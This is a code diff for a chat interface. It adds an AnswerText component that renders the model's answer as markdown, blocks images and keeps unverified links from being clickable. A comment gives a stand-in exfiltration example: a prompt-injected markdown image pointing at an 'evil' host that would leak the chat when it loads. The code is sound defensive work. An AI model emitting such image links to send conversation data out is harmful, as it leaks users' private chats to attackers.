@@ -228,6 +228,29 @@ export function isVerifiedLink(href: string | undefined, sources: string[] | und
   return !!href && href.startsWith("https://") && !!sources?.includes(href);
 }
 
+/** The model's answer as markdown, with the two protections against injected output. */
+export function AnswerText({ text, sources }: { text: string; sources?: string[] }) {
+  return (
+    <Markdown
+      // Images never render: a prompt-injected ![](https://evil/?q=...) would
+      // load on its own and leak the chat. The manifest CSP blocks them too.
+      disallowedElements={["img"]}
+      components={{
+        // Only links to pages the tools actually returned are clickable.
+        // Anything else the model shaped like a link renders as text.
+        a: ({ href, children }) =>
+          isVerifiedLink(href, sources) ? (
+            <a href={href} target="_blank" rel="noopener noreferrer">{children}</a>
+          ) : (
+            <span>{children}</span>
+          ),
+      }}
+    >
+      {text}
+    </Markdown>
+  );
+}
+
 function AssistantMessage({ message: m }: { message: Message }) {
   const [copied, setCopied] = useState(false);
   const looking = m.streaming && !m.text && m.tools.length > 0;
@@ -247,22 +270,7 @@ function AssistantMessage({ message: m }: { message: Message }) {
           Looking up {uniqueTools.map((t) => TOOL_LABELS[t] ?? t).join(" and ")}…
         </p>
       )}
-      {m.text && (
-        <Markdown
-          components={{
-            // Only links to pages the tools actually returned are clickable.
-            // Anything else the model shaped like a link renders as text.
-            a: ({ href, children }) =>
-              isVerifiedLink(href, m.sources) ? (
-                <a href={href} target="_blank" rel="noopener noreferrer">{children}</a>
-              ) : (
-                <span>{children}</span>
-              ),
-          }}
-        >
-          {m.text}
-        </Markdown>
-      )}
+      {m.text && <AnswerText text={m.text} sources={m.sources} />}
       {m.error && <p className="error" role="alert">{m.error}</p>}
       {!m.streaming && (m.text || m.error) && (
         <div className="meta">
